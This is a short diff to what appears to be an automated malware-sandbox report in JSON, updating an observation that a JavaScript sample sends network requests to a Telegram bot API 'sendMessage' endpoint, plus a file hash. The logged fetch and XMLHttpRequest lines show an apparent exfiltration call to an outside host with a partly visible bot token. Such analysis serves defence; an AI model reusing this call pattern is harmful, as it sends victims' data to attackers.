@@ -170,7 +170,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript prepares a network request\n\t\t[2023-05-25T13:18:20.095Z] fetch(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzc...\n\t\t[2023-05-25T13:18:20.095Z] XMLHttpRequest[77].open(get,https://api.telegram.org/bot6138224277:AAGTts...\n\t\t[2023-05-25T13:18:20.096Z] new URL(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEg...",
+        "body": "JavaScript prepares a network request\n\t\tfetch(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_id...\n\t\tXMLHttpRequest[77].open(get,https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb...\n\t\tnew URL(https://api.telegram.org/bot6138224277:AAGTtsiVLxup1-ifw6g3spfMEgzcASMrb9g/sendMessage?chat_...",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -413,7 +413,7 @@
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "cc8cb30f8e422dd842cec2293bcb592d0a216810f8ecee7e79e86506796b5f89"
+        "sha256": "8224c66a18f4e5947c544c34f614de0eb6da47d7d76a10f6cfb400ac253e6312"
       }
     ]
   },
